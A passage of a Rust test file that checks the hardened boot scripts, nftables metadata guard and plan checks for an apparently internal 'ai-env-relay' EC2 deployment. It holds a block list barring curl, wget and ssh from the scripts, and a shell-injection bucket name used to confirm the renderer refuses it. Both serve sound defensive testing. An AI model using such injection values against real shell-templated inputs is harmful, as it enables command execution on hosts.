/// line of R's missing (the guard's IPv4, SYN or non-TCP rule, the unit's D-Bus and resolved blocks and its swap allowance
/// among them), a rule ahead of the guard's holding a verdict or conntrack (each of accept, return, jump, goto, queue, ct
/// and notrack), a heredoc delimiter in R's unit, R's guard.nft missing; the same words in a comment are no statement,
/// and a reload.py past EC2's limit no longer refused (the controls). The bucket, key and hash the user data takes are
/// refused unless of their shapes: they go into a shell script.
#[test]
fn the_relay_files_render_small_whole_and_hardened() {
    let deploy = Path::new(REPO).join("crates/ai-env-relay/deploy");
    let relay_dir = infra().join("relay");
    let r = rendered_relay();
    let (ud, boot) = (r["userData"].as_str().unwrap(), r["files"]["boot"].as_str().unwrap());
    let (key, sha) = (r["files"]["bootKey"].as_str().unwrap(), r["files"]["bootSha256"].as_str().unwrap());
    let t = tempfile::tempdir().unwrap();

    // The user data's own checks.
    assert!(ud.len() <= 16_384, "{} bytes", ud.len());
    assert_eq!(placeholder_in(ud), None);
    parses(t.path(), "user-data.sh", ud);
    let ud_lines: Vec<&str> = ud.lines().collect();
    let ud_at = |want: &str| ud_lines.iter().position(|l| *l == want).unwrap_or_else(|| panic!("no line {want}:\n{ud}"));
    let fetch = format!("until timeout 60 aws s3api get-object --bucket '{BUCKET}' --key '{key}' --region 'eu-central-1' --endpoint-url 'https://s3.eu-central-1.amazonaws.com' \"$boot\" > /dev/null; do");
    let swap = [
        "if [ ! -f /swapfile ]; then",
        "  dd if=/dev/zero of=/swapfile.new bs=1M count=512 status=none",
        "  chmod 0600 /swapfile.new",
        "  mkswap /swapfile.new > /dev/null",
        "  mv /swapfile.new /swapfile",
        "fi",
        "swapon --show=NAME --noheadings | grep -qx /swapfile || swapon /swapfile",
        "grep -q '^/swapfile ' /etc/fstab || echo '/swapfile none swap defaults 0 0' >> /etc/fstab",
    ];
    assert_eq!(ud_lines[3..3 + swap.len()], swap, "LD-R57: the swap first, and for good: on, and in /etc/fstab");
    assert!(ud_at(swap[7]) < ud_at(&fetch), "the swap steps come before the fetch (the aws CLI is OOM-killed at t4g.nano memory)");
    assert_eq!(ud.matches("aws s3api get-object").count(), 1, "the bootstrap's one fetch");
    assert_eq!(ud.matches(sha).count(), 2, "the pin, and the refusal naming it: {ud}");
    let pin = ud_at(&format!("if [ \"$got\" != '{sha}' ]; then"));
    assert!(ud_at(&fetch) < ud_at("got=$(sha256sum \"$boot\" | cut -d' ' -f1)") && ud_at("got=$(sha256sum \"$boot\" | cut -d' ' -f1)") < pin, "fetched, then hashed, then compared");
    assert_eq!(ud_lines.last(), Some(&"exec /bin/bash \"$boot\""), "/bin/bash on the file, the last step");
    for gone in ["useradd", "dnf", "systemctl", "swapoff", "umask"] {
        assert!(!ud.contains(gone), "{gone} in the user data: boot.sh's, and no umask of its own to pass on to it");
    }

    // The boot script's.
    assert_eq!(placeholder_in(boot), None);
    parses(t.path(), "boot.sh", boot);
    assert!(boot.starts_with("#!/bin/bash\nset -euo pipefail\n"), "I-R26");
    let (block, rest) = split_reload_block(boot);
    assert!(!block.is_empty() && block.iter().all(|l| l.len() <= 76), "base64 in lines of 76: {block:?}");
    use base64::Engine as _;
    let gz = base64::engine::general_purpose::STANDARD.decode(block.concat()).unwrap();
    assert_eq!(gunzip(&gz), std::fs::read(relay_dir.join("reload.py")).unwrap(), "the embedded reload unit is reload.py");
    let unit = text(&deploy.join("ai-env-relay.service")).replace("@RELAY_IP@", "10.42.0.20").replace("@RELAY_PORT@", "7443");
    let cw = text(&relay_dir.join("cloudwatch-agent.json")).replace("@LOG_GROUP@", "/ai-env/relay");
    for (delimiter, file) in [
        ("AIENV_RELAY_UNIT_EOF", unit),
        ("AIENV_RELAY_UNIT_EOF", text(&deploy.join("ai-env-relay-guard.service"))),
        ("AIENV_RELAY_UNIT_EOF", text(&deploy.join("guard.nft"))),
        ("AIENV_RELAY_CW_EOF", cw),
    ] {
        assert!(file.ends_with('\n') && boot.contains(&format!("<<'{delimiter}'\n{file}{delimiter}\n")), "not embedded byte for byte:\n{file}");
    }
    for (file, lines) in r["required"].as_object().unwrap() {
        for want in lines.as_array().unwrap() {
            assert!(boot.lines().any(|l| l.trim() == want), "{file}'s line {want} is not a line of the boot script");
        }
    }
    let example = text(&deploy.join("relay.env.example"));
    let example: Vec<&str> = example.lines().filter(|l| l.starts_with("AI_ENV_RELAY_")).collect();
    let written: Vec<&str> = rest.split('\'').filter(|w| w.starts_with("AI_ENV_RELAY_")).collect();
    assert_eq!(written.len(), 5, "{written:?}");
    for w in &written {
        assert!(example.contains(w), "relay.env's {w} is not a line of R's relay.env.example");
    }
    let unwritten: Vec<&str> = example.iter().filter(|l| !written.contains(l)).map(|l| l.split('=').next().unwrap()).collect();
    assert_eq!(unwritten, ["AI_ENV_RELAY_ID"], "R's example names nothing else");
    for line in [
        "OnBootSec=15s",
        "OnCalendar=*-*-* *:*:00",
        "AccuracySec=1s",
        "Type=oneshot",
        "EnvironmentFile=/etc/ai-env-relay/reload.env",
        "ExecStart=/usr/local/sbin/ai-env-relay-reload",
        "TimeoutStartSec=300",
        "Nice=5",
        "Wants=network-online.target",
        "After=network-online.target",
        "WantedBy=timers.target",
        "OnCalendar=Sun *-*-* 03:30:00 UTC",
        "RandomizedDelaySec=1800",
        "Persistent=true",
        "ExecStart=/usr/local/sbin/ai-env-relay-patch",
        "TimeoutStartSec=1800",
        "systemctl enable ai-env-relay-guard.service ai-env-relay.service",
        "systemctl enable --now ai-env-relay-reload.timer ai-env-relay-patch.timer logrotate.timer",
    ] {
        assert!(boot.lines().any(|l| l == line), "no line {line}");
    }
    for want in ["useradd --system", "dnf -y install amazon-cloudwatch-agent logrotate nftables dnf-plugins-core"] {
        assert!(boot.contains(want), "{want}");
    }
    assert!(!rest.contains("/swapfile") && !rest.contains("swapoff"), "the swap is the user data's, and nothing removes it");
    assert!(!rest.contains("aws s3"), "aws s3api get-object is the bootstrap's one fetch (the binary's is reload.py's)");

    // Both: the hex of the pin and the key is not text of the script ("22" may well be in it).
    let bootstrap = ud.replace(sha, "SHA256").replace(key, "KEY");
    for never in ["dnf update", "curl", "wget", "ssh", "22"] {
        assert!(!bootstrap.contains(never), "{never} in the user data");
        assert!(!rest.contains(never), "{never} in the boot script (outside reload.py's base64)");
    }

    // R-95 and R-96, the relay security plan's one user-data change; LD-R57.
    let required = r["required"]["ai-env-relay.service"].as_array().unwrap();
    for block in ["InaccessiblePaths=/run/dbus", "InaccessiblePaths=-/run/systemd/resolve", "MemorySwapMax=256M"] {
        assert!(required.iter().any(|l| l == block), "lines slice I rests on (F29's socket blocks, LD-R57's swap): {block} is not in {required:?}");
    }
    let lines: Vec<&str> = boot.lines().collect();
    let at = |want: &str| lines.iter().position(|l| *l == want).unwrap_or_else(|| panic!("no line {want}"));
    let drop_in = at("cat > /etc/systemd/system/logrotate.timer.d/ai-env.conf <<'AIENV_RELAY_UNIT_EOF'");
    assert_eq!(
        lines[drop_in + 1..drop_in + 7],
        ["[Timer]", "OnCalendar=", "OnCalendar=*:0/5", "AccuracySec=1min", "RandomizedDelaySec=0", "AIENV_RELAY_UNIT_EOF"],
        "logrotate every 5 minutes (F23), whatever accuracy or delay the package's timer carries"
    );
    for head in ["/var/log/ai-env-relay/*.log {", "/var/log/ai-env-relay/requests/*.log {"] {
        let stanza = at(head);
        let directives: Vec<&str> = lines[stanza + 1..].iter().map(|l| l.trim()).take_while(|l| *l != "}").collect();
        for want in ["size 20M", "nodateext"] {
            assert!(directives.contains(&want), "{head} {want}: a log past 20 MB rotates at any run, however many a day: {directives:?}");
        }
        for never in ["hourly", "daily", "weekly", "monthly", "yearly", "maxsize", "dateext", "dateformat"] {
            assert!(!directives.iter().any(|d| d.starts_with(never)), "{head} {never}: size alone, with no interval and no date in the name, rotates at every run past 20M: {directives:?}");
        }
    }
    assert!(!boot.contains("OnCalendar=hourly") && !boot.contains("maxsize"), "no hourly timer, no maxsize anywhere");
    let cw: Value = serde_json::from_str(r["files"]["cwAgent"].as_str().unwrap()).unwrap();
    assert_eq!(cw["agent"]["run_as_user"], "cwagent", "the CloudWatch agent never runs as root (F21)");
    let ctl = lines.iter().position(|l| l.starts_with("/opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl ")).expect("the agent's start");
    let usermod = at("usermod -aG ai-env-relay cwagent || logger -s -t ai-env-relay-user-data 'cwagent could not join ai-env-relay: requests.log is not shipped' || true");
    assert!(
        at("rpm -q amazon-cloudwatch-agent logrotate nftables dnf-plugins-core > /dev/null") < usermod && usermod < ctl,
        "cwagent joins the relay's group after the packages, before the agent starts, never fatal (I-R26 step 10)"
    );
    let groups = at("cat > /etc/systemd/system/amazon-cloudwatch-agent.service.d/ai-env.conf <<'AIENV_RELAY_UNIT_EOF'");
    assert_eq!(
        lines[groups + 1..groups + 4],
        ["[Service]", "SupplementaryGroups=ai-env-relay", "AIENV_RELAY_UNIT_EOF"],
        "the agent holds the relay's group on every thread: its start sets cwagent's groups on one thread alone and execs from any (agent issue 1140)"
    );
    assert!(groups < at("systemctl daemon-reload") && groups < ctl, "the drop-in is in place before the agent's start reloads and starts it");
    let relay_log = at("[ -e /var/log/ai-env-relay/relay.log ] || install -m 0644 -o root -g root /dev/null /var/log/ai-env-relay/relay.log");
    let dirs = at("install -d -m 0755 -o root -g root /etc/ai-env-relay /usr/local/libexec/ai-env-relay /var/log/ai-env-relay /etc/systemd/system/logrotate.timer.d /etc/systemd/system/amazon-cloudwatch-agent.service.d");
    assert!(
        dirs < relay_log && relay_log < at("systemctl enable ai-env-relay-guard.service ai-env-relay.service"),
        "relay.log 0644 root before the units start, made only when missing (install unlinks the file it replaces: safe to run twice)"
    );
    for (file, want) in [("user-data.sh", vec!["#!/bin/bash"]), ("boot.sh", vec!["#!/bin/bash", "#!/bin/bash"])] {
        let template = text(&relay_dir.join(file));
        let comments: Vec<&str> = template.lines().filter(|l| l.trim_start().starts_with('#')).collect();
        assert_eq!(comments, want, "{file} carries no comment: their steps are relay-spec.ts's: its shebang, and in boot.sh the patch script's");
    }

    // The refusals, each on a copy of infra/relay and R's deploy/ with one change.
    let case = |name: &str| -> (PathBuf, PathBuf) {
        let (dir, deploy_dir) = (t.path().join(name).join("relay"), t.path().join(name).join("deploy"));
        copy_dir(&relay_dir, &dir);
        copy_dir(&deploy, &deploy_dir);
        (dir, deploy_dir)
    };
    let mut cases: Vec<(&str, PathBuf, PathBuf, String)> = vec![];
    // The user data past the limit: 17 KiB of comment.
    let (dir, d) = case("padded");
    append(&dir.join("user-data.sh"), &format!("# {}\n", "pad ".repeat(17 * 256)));
    cases.push(("padded", dir.clone(), d, format!("{}/user-data.sh: rendered ", dir.display())));
    // reload.py padded past the limit with 24 KiB of a SHA-256 chain's hex, its .gz regenerated (incompressible enough):
    // the boot object's size has no limit (LD-R56).
    let (dir, d) = case("padded-reload");
    let mut h = Sha256::digest(b"ai-env relay padding").to_vec();
    let mut pad = String::new();
    while pad.len() < 24 * 1024 {
        pad.push_str(&format!("# {}\n", hex::encode(&h)));
        h = Sha256::digest(&h).to_vec();
    }
    append(&dir.join("reload.py"), &pad);
    let mut cmd = Command::new("/usr/bin/gzip");
    cmd.args(["-9", "-n", "-c"]).arg(dir.join("reload.py")).stdin(Stdio::null());
    let o = bounded(&mut cmd, "gzip");
    assert!(o.status.success(), "gzip: {}", stderr(&o));
    std::fs::write(dir.join("reload.py.gz"), &o.stdout).unwrap();
    cases.push(("padded-reload", dir, d, String::new()));
    let (dir, d) = case("stale-gz");
    append(&dir.join("reload.py"), "# changed\n");
    cases.push(("stale-gz", dir.clone(), d, format!("{}/reload.py.gz is not reload.py compressed: run make relay-reload-gz", dir.display())));
    let (dir, d) = case("placeholder");
    append(&dir.join("reload.py"), "# @X@\n");
    cases.push(("placeholder", dir.clone(), d, format!("{}/reload.py: holds the placeholder @X@, which nothing fills", dir.display())));
    for (name, file) in [("placeholder-in-boot", "boot.sh"), ("placeholder-in-user-data", "user-data.sh")] {
        let (dir, d) = case(name);
        append(&dir.join(file), "true @X@\n");
        cases.push((name, dir.clone(), d, format!("{}/{file}: unknown placeholder(s) @X@ left after rendering (none is filled later)", dir.display())));
    }
    for (name, file, token) in [("no-reload-token", "boot.sh", "RELOAD_PY_GZ"), ("no-unit-token", "boot.sh", "RELAY_UNIT"), ("no-pin-token", "user-data.sh", "BOOT_HASH"), ("no-key-token", "user-data.sh", "BOOT_KEY")] {
        let (dir, d) = case(name);
        std::fs::write(dir.join(file), text(&dir.join(file)).replace(&format!("@{token}@"), "x")).unwrap();
        cases.push((name, dir.clone(), d, format!("{}/{file}: the placeholder(s) @{token}@ are missing (contract 3)", dir.display())));
    }
    let (dir, d) = case("no-boot-sh");
    std::fs::remove_file(dir.join("boot.sh")).unwrap();
    cases.push(("no-boot-sh", dir.clone(), d, format!("{}/boot.sh not found (the relay's boot files, infra/relay)", dir.display())));
    let missing = |d: &Path, file: &str, line: &str| format!("{}/{file}: the line \"{line}\" is missing: slice I's layout or the plan's IMDS block rests on it (plans/s13-contracts.md §I-infra.4.5)", d.display());
    let (dir, d) = case("no-ip-address-deny");
    drop_lines(&d.join("ai-env-relay.service"), "IPAddressDeny=");
    cases.push(("no-ip-address-deny", dir, d.clone(), missing(&d, "ai-env-relay.service", "IPAddressDeny=169.254.0.0/16 fd00:ec2::/32")));
    let (dir, d) = case("no-user");
    drop_lines(&d.join("ai-env-relay.service"), "User=ai-env-relay");
    cases.push(("no-user", dir, d.clone(), missing(&d, "ai-env-relay.service", "User=ai-env-relay")));
    let (dir, d) = case("no-dbus-block");
    drop_lines(&d.join("ai-env-relay.service"), "InaccessiblePaths=/run/dbus");
    cases.push(("no-dbus-block", dir, d.clone(), missing(&d, "ai-env-relay.service", "InaccessiblePaths=/run/dbus")));
    let (dir, d) = case("no-resolve-block");
    drop_lines(&d.join("ai-env-relay.service"), "/run/systemd/resolve");
    cases.push(("no-resolve-block", dir, d.clone(), missing(&d, "ai-env-relay.service", "InaccessiblePaths=-/run/systemd/resolve")));
    // LD-R57: the swap is a stated requirement.
    let (dir, d) = case("no-swap-allowance");
    drop_lines(&d.join("ai-env-relay.service"), "MemorySwapMax=");
    cases.push(("no-swap-allowance", dir, d.clone(), missing(&d, "ai-env-relay.service", "MemorySwapMax=256M")));
    let (dir, d) = case("no-ipv4-guard");
    drop_lines(&d.join("guard.nft"), "ip daddr 169.254.0.0/16");
    cases.push(("no-ipv4-guard", dir, d.clone(), missing(&d, "guard.nft", "meta skuid \"ai-env-relay\" ip daddr 169.254.0.0/16 counter reject")));
    // §Q.8 F4's two stateless rules: the relay's user sends no SYN without ACK and no packet but TCP.
    let (dir, d) = case("no-syn-guard");
    drop_lines(&d.join("guard.nft"), "tcp flags");
    cases.push(("no-syn-guard", dir, d.clone(), missing(&d, "guard.nft", "meta skuid \"ai-env-relay\" tcp flags & (syn | ack) == syn counter reject with tcp reset")));
    let (dir, d) = case("no-non-tcp-guard");
    drop_lines(&d.join("guard.nft"), "l4proto");
    cases.push(("no-non-tcp-guard", dir, d.clone(), missing(&d, "guard.nft", "meta skuid \"ai-env-relay\" meta l4proto != tcp counter reject")));
    // Nothing may decide before the guard's rules or load conntrack: each word in a rule put first in the chain (the
    // review's `accept` to IMDS; §Q.8 F4's old `ct state new` rule).
    let weakened = |d: &Path, rule: &str, word: &str| format!("{}/guard.nft: the line \"{rule}\" holds \"{word}\": the guard takes no verdict but its chain's policy (one before the rules lets the relay's user past them) and no conntrack (§Q.8 F4) (plans/s13-contracts.md §I-infra.4.5)", d.display());
    for (name, word, rule) in [
        ("accept-first", "accept", "ip daddr 169.254.169.254 accept"),
        ("return-first", "return", "meta skuid \"ai-env-relay\" return"),
        ("jump-first", "jump", "meta skuid \"ai-env-relay\" jump allowed"),
        ("goto-first", "goto", "meta skuid \"ai-env-relay\" goto allowed"),
        ("queue-first", "queue", "meta skuid \"ai-env-relay\" queue flags bypass"),
        ("ct-state-new", "ct", "meta skuid \"ai-env-relay\" ct state new counter reject"),
        ("notrack-first", "notrack", "meta skuid \"ai-env-relay\" notrack"),
    ] {
        let (dir, d) = case(name);
        let (nft, hook) = (text(&d.join("guard.nft")), "policy accept;\n");
        assert!(nft.contains(hook), "{name}: R's guard.nft has no {hook:?}");
        std::fs::write(d.join("guard.nft"), nft.replacen(hook, &format!("{hook}        {rule}\n"), 1)).unwrap();
        cases.push((name, dir, d.clone(), weakened(&d, rule, word)));
    }
    // The control: the same words in a comment are accepted.
    let (dir, d) = case("words-in-a-comment");
    let nft = text(&d.join("guard.nft"));
    let first = nft.lines().find(|l| l.starts_with("# ")).expect("a comment line in R's guard.nft").to_string();
    std::fs::write(d.join("guard.nft"), nft.replacen(&first, "# accept, return, jump, goto, queue, ct, notrack", 1)).unwrap();
    cases.push(("words-in-a-comment", dir, d, String::new()));
    let (dir, d) = case("delimiter");
    append(&d.join("ai-env-relay.service"), "# AIENV_RELAY_UNIT_EOF\n");
    cases.push(("delimiter", dir, d.clone(), format!("{}/ai-env-relay.service contains AIENV_RELAY_UNIT_EOF, a heredoc delimiter of boot.sh: the embedded copy would end early", d.display())));
    let (dir, d) = case("no-guard-nft");
    std::fs::remove_file(d.join("guard.nft")).unwrap();
    cases.push(("no-guard-nft", dir, d.clone(), format!("{}/guard.nft not found (the relay's unit and IMDS guard, crates/ai-env-relay/deploy)", d.display())));
    let list = Value::Array(cases.iter().map(|(name, dir, d, _)| json!([name, dir, d])).collect()).to_string();
    let got = node(
        r#"const refusals = {};
for (const [name, dir, deploy] of JSON.parse(process.env.RT_CASES)) {
  try { rs.renderRelayUserData(process.env.RT_BUCKET, rs.renderRelayFiles(cfg, 'eu-central-1', dir, deploy), 'eu-central-1', dir); refusals[name] = ''; } catch (e) { refusals[name] = e.message; }
}
console.log(JSON.stringify(refusals));"#,
        &[("RT_CASES", &list), ("RT_BUCKET", BUCKET)],
    );
    for (name, _, _, want) in &cases {
        let message = got[name].as_str().unwrap();
        if *name == "padded" {
            assert!(message.starts_with(want) && message.ends_with("bytes, over EC2's 16384-byte user data limit"), "{name}: {message}");
        } else {
            assert_eq!(message, want, "{name}");
        }
    }

    // What goes into the shell script is of its shape.
    let shapes = node(
        r#"const dir = path.join(infra, 'relay'), good = rs.relayBootPin('a boot script');
const refused = (bucket, pin) => { try { return rs.renderRelayUserData(bucket, pin, 'eu-central-1', dir) && ''; } catch (e) { return e.message; } };
console.log(JSON.stringify({
  good: refused(process.env.RT_BUCKET, good),
  quote: refused("ai-env-artifacts-0'; true #", good),
  other: refused('other-bucket', good),
  key: refused(process.env.RT_BUCKET, { ...good, bootKey: rs.relayBootPin('another text').bootKey }),
  binary: refused(process.env.RT_BUCKET, { ...good, bootKey: 'relay/ai-env-relay-' + good.bootSha256.slice(0, 16) }),
  sha: refused(process.env.RT_BUCKET, { ...good, bootSha256: good.bootSha256.toUpperCase() }),
}));"#,
        &[("RT_BUCKET", BUCKET)],
    );
    assert_eq!(shapes["good"], "");
    for (k, want) in [
        ("quote", "relay user data: bucket \"ai-env-artifacts-0'; true #\" is not ai-env-artifacts-<suffix>"),
        ("other", "relay user data: bucket \"other-bucket\" is not ai-env-artifacts-<suffix>"),
        ("key", "relay user data: the boot object's key "),
        ("binary", "relay user data: the boot object's key "),
        ("sha", "relay user data: the boot object's sha256 "),
    ] {
        assert!(shapes[k].as_str().unwrap().starts_with(want), "{k}: {}", shapes[k]);
    }
}

/// reload.py's list `name` (`NAME = [...]`, one line, JSON-shaped).
fn reload_py_list(name: &str) -> Vec<String> {
    let source = text(&infra().join("relay/reload.py"));
    let line = source.lines().find(|l| l.starts_with(&format!("{name} = ["))).unwrap_or_else(|| panic!("reload.py has no {name}"));
    serde_json::from_str(line.split_once(" = ").unwrap().1).unwrap()
}

/// I-T9: policies.ts's, reload.py's and Rust's parameter lists are the same seven in one order (`peers`, R-93, then
/// `access`, R-147, right before `tls`), `tls` alone the secret in each (the one that is neither the artifact nor a list
/// document), and Rust's names of the five lists are the worker SDK's (B-16, R-85, R-143). check-policies.sh and
/// policies.ts, which count them in words, count seven for the relay's role and six for ai-env-ops.
#[test]
fn the_relay_parameter_lists_agree() {
    use ai_env_cli::bridge::egress::{relay_param_name, RELAY_PARAMETERS};
    let ts = node("console.log(JSON.stringify({ params: pol.RELAY_PARAMETERS, tls: pol.RELAY_TLS }));", &[]);
    let rust: Vec<String> = RELAY_PARAMETERS.iter().map(|p| p.to_string()).collect();
    let (py, lists) = (reload_py_list("PARAMETERS"), reload_py_list("LISTS"));
    assert_eq!(rust, ["artifact", "workers", "grants", "token-signers", "peers", "access", "tls"], "bridge::egress::RELAY_PARAMETERS");
    assert_eq!(ts["params"], json!(rust), "policies.ts RELAY_PARAMETERS");
    assert_eq!(py, rust, "reload.py PARAMETERS");
    assert_eq!(ts["tls"], "tls", "policies.ts RELAY_TLS");
    let worker = [ai_env_worker::policy::WORKERS, ai_env_worker::policy::GRANTS, ai_env_worker::policy::TOKEN_SIGNERS, ai_env_worker::policy::PEERS, ai_env_worker::policy::ACCESS];
    assert_eq!(["workers", "grants", "token-signers", "peers", "access"].map(relay_param_name), worker.map(String::from));
    assert_eq!(lists, ["workers", "grants", "token-signers", "peers", "access"], "reload.py LISTS");
    let secret_py: Vec<&String> = py.iter().filter(|p| *p != "artifact" && !lists.contains(p)).collect();
    assert_eq!(secret_py, ["tls"]);
    let secret_rust: Vec<&&str> = RELAY_PARAMETERS.iter().filter(|p| **p != "artifact" && !worker.contains(&relay_param_name(p).as_str())).collect();
    assert_eq!(secret_rust, [&"tls"]);
    // The counts in words: a reader takes them from these texts, and nothing else notices when a new list leaves them stale.
    for (file, seven, six) in [("scripts/check-policies.sh", 2, 2), ("policies.ts", 2, 1)] {
        let source = text(&infra().join(file));
        let said = |count: &str| source.matches(count).count();
        assert_eq!((said("its seven parameters"), said("its six non-secret"), said("its six parameters"), said("its five non-secret")), (seven, six, 0, 0), "{file}: a count of the relay's parameters");
    }
}

/// I-T10: relayArtifactValue writes exactly the four keys in their order and parseRelayArtifactValue takes it back;
/// a key not the sha256's, an uppercase sha256, another bucket prefix, an extra key, a missing one, a version with a
/// space are refused by both.
#[test]
fn the_relay_artifact_value_is_exact() {
    let r = node(
        r#"const sha = '0123456789abcdef'.repeat(4);
const good = { bucket: 'ai-env-artifacts-0000000', key: 'relay/ai-env-relay-0123456789abcdef', sha256: sha, version: '0.12.0' };
const value = (a) => { try { return rs.relayArtifactValue(a); } catch (e) { return 'refused: ' + e.message; } };
const { version, ...noVersion } = good;
const bad = {
  "a key not the sha256's": { ...good, key: 'relay/ai-env-relay-fedcba9876543210' },
  'an uppercase sha256': { ...good, sha256: sha.toUpperCase() },
  'another bucket prefix': { ...good, bucket: 'other-artifacts-0000000' },
  'an extra key': { ...good, extra: 'x' },
  'a missing key': noVersion,
  'a version with a space': { ...good, version: '0.12.0 beta' },
};
console.log(JSON.stringify({
  value: value(good), back: rs.parseRelayArtifactValue(value(good)),
  bad: Object.fromEntries(Object.entries(bad).map(([k, a]) => [k, [value(a), rs.parseRelayArtifactValue(JSON.stringify(a))]])),
}));"#,
        &[],
    );
    let want = format!(
        "{{\"bucket\":\"ai-env-artifacts-0000000\",\"key\":\"relay/ai-env-relay-0123456789abcdef\",\"sha256\":\"{}\",\"version\":\"0.12.0\"}}",
        "0123456789abcdef".repeat(4)
    );
    assert_eq!(r["value"], want.as_str());
    assert_eq!(r["back"], serde_json::from_str::<Value>(&want).unwrap());
    let bad = r["bad"].as_object().unwrap();
    assert_eq!(bad.len(), 6);
    for (what, pair) in bad {
        assert!(pair[0].as_str().is_some_and(|v| v.starts_with("refused: relay artifact: ")), "{what}: relayArtifactValue took it: {pair}");
        assert!(pair[1].is_string(), "{what}: parseRelayArtifactValue took it: {pair}");
    }
}

/// The stack's URN in the synthetic plans.
const STACK_URN: &str = "urn:pulumi:dev::ai-env::pulumi:pulumi:Stack::ai-env-dev";
/// How a preview spells a value it does not know yet (check-plan.ts UNKNOWN).
const UNKNOWN: &str = "04da6b54-80e4-46f7-96ec-b56ff0331ba9";

fn urn(ty: &str, name: &str) -> String {
    format!("urn:pulumi:dev::ai-env::{ty}::{name}")
}

/// A create step of `ty` `name`: its inputs empty (a provider's: its region), a child of the stack under its package's
/// pinned provider.
fn create(ty: &str, name: &str) -> Value {
    let u = urn(ty, name);
    let mut state = json!({"urn": u, "type": ty, "custom": true, "parent": STACK_URN, "inputs": {}, "propertyDependencies": {}});
    if ty.starts_with("pulumi:providers:") {
        state["inputs"] = json!({"region": "eu-central-1"});
    } else {
        let (package, provider) = if ty.starts_with("aws-native:") { ("aws-native", "aws-native-eu-central-1") } else { ("aws", "aws-eu-central-1") };
        state["provider"] = json!(format!("{}::{UNKNOWN}", urn(&format!("pulumi:providers:{package}"), provider)));
    }
    json!({"op": "create", "urn": u, "newState": state})
}

/// A `pulumi preview --json` plan's steps creating the whole dnsMode none inventory, then the stack.
fn inventory_plan() -> Vec<Value> {
    let inv = inventories();
    let mut steps: Vec<Value> = vec![];
    for (ty, names) in inv["none"].as_object().unwrap() {
        steps.extend(names.as_array().unwrap().iter().map(|n| create(ty, n.as_str().unwrap())));
    }
    steps.push(json!({"op": "create", "urn": STACK_URN, "newState": {"urn": STACK_URN, "type": "pulumi:pulumi:Stack", "custom": false}}));
    steps
}

/// The new state of `ty` `name`'s step, its inputs and property dependencies replaced.
fn set_state(steps: &mut [Value], ty: &str, name: &str, inputs: Value, deps: Value) {
    let u = urn(ty, name);
    let step = steps.iter_mut().find(|s| s["urn"] == u.as_str()).unwrap_or_else(|| panic!("no step {u}"));
    step["newState"]["inputs"] = inputs;
    step["newState"]["propertyDependencies"] = deps;
}

/// infra/scripts/check-plan.sh --mode none --account-id 123456789012 over the plan of `steps` on stdin, as make deploy
/// runs it, its compile under a PLAN_CHECK_OUT of its own.
fn check_plan(steps: &[Value]) -> Output {
    let t = tempfile::tempdir().unwrap();
    check_plan_compiling(steps, &t.path().join("out"))
}

/// [`check_plan`] with its compile in `out`, for [`check_plan_again`].
fn check_plan_compiling(steps: &[Value], out: &Path) -> Output {
    let t = tempfile::tempdir().unwrap();
    let file = t.path().join("plan.json");
    std::fs::write(&file, json!({"steps": steps, "diagnostics": []}).to_string()).unwrap();
    let mut cmd = Command::new("/bin/bash");
    isolate(&mut cmd, t.path());
    cmd.arg(infra().join("scripts/check-plan.sh"))
        .args(["--mode", "none", "--account-id", ACCOUNT])
        .env("PLAN_CHECK_OUT", out)
        .stdin(std::fs::File::open(&file).unwrap());
    bounded(&mut cmd, "check-plan.sh")
}

/// A later plan over the compile [`check_plan_compiling`] left in `out`: the check-plan.js and the arguments of
/// check-plan.sh's last line, without its seconds of tsc.
fn check_plan_again(steps: &[Value], out: &Path) -> Output {
    let t = tempfile::tempdir().unwrap();
    let file = t.path().join("plan.json");
    std::fs::write(&file, json!({"steps": steps, "diagnostics": []}).to_string()).unwrap();
    let mut cmd = Command::new("node");
    isolate(&mut cmd, t.path());
    cmd.arg(out.join("scripts/check-plan.js"))
        .arg("--egress-config")
        .arg(infra().join("egress-config.json"))
        .arg("--image-config")
        .arg(infra().join("image-config.json"))
        .args(["--mode", "none", "--account-id", ACCOUNT])
        .stdin(std::fs::File::open(&file).unwrap());
    bounded(&mut cmd, "check-plan.js")
}

/// I-T11: a plan creating every inventory entry (empty inputs: refused, exit 1) is counted whole: no type or name the
/// inventory lacks, nothing missing, the totals and the pin agreeing. Without the association's step its row is
/// missing; a second Elastic IP is not in the inventory.
#[test]
fn the_plan_check_counts_the_relay_in_a_complete_plan() {
    let steps = inventory_plan();
    let counted = |o: &Output| -> Vec<String> {
        let words = ["not in the stack inventory", "missing from the plan", "resources, expected", "the stack inventory holds"];
        stderr(o).lines().filter(|l| words.iter().any(|w| l.contains(w))).map(str::to_string).collect()
    };
    let out = check_plan(&steps);
    assert_eq!(out.status.code(), Some(1), "empty inputs are refused: {}", all(&out));
    assert_eq!(counted(&out), Vec::<String>::new(), "{}", all(&out));
    let association = urn("aws:ec2/eipAssociation:EipAssociation", "ai-env-relay");
    let without: Vec<Value> = steps.iter().filter(|s| s["urn"] != association.as_str()).cloned().collect();
    let out = check_plan(&without);
    assert!(stderr(&out).contains("aws:ec2/eipAssociation:EipAssociation: missing from the plan: ai-env-relay"), "{}", all(&out));
    let mut more = steps.clone();
    more.push(create("aws:ec2/eip:Eip", "ai-env-relay-2"));
    let out = check_plan(&more);
    assert!(stderr(&out).contains("aws:ec2/eip:Eip: not in the stack inventory: ai-env-relay-2"), "{}", all(&out));
}

/// I-T12: over I-T11's plan with the relay's own inputs as the program plans them, each widening prints its line: the
/// relay's IMDS hop limit 2, its private port open to the internet, the Elastic IP on the proxy, an artifact parameter
/// naming another key than the object's, ai-env-ops' document built without the relay instance; and the boot object
/// (LD-R56) held as the artifact is: another key shape, a key not its content's, another bucket, another content type, a
/// `source` beside its content, no content; the instance not depending on it, its user data pinning another object or
/// not the rendering of user-data.sh, unknown with nothing it is built from being created, or neither text nor unknown.
/// The plan as planned, and with its user data unknown while the bucket is created, prints none of them.
#[test]
fn the_plan_check_refuses_a_widened_relay() {
    const INSTANCE: &str = "aws:ec2/instance:Instance";
    const RULE: (&str, &str) = ("aws:vpc/securityGroupIngressRule:SecurityGroupIngressRule", "ai-env-relay-from-ai-env-vm-egress-tcp-7443");
    const ASSOCIATION: &str = "aws:ec2/eipAssociation:EipAssociation";
    const PARAMETER: &str = "aws:ssm/parameter:Parameter";
    const POLICY: &str = "aws:iam/policy:Policy";
    let (relay, proxy) = (urn(INSTANCE, "ai-env-relay"), urn(INSTANCE, "ai-env-egress-proxy"));
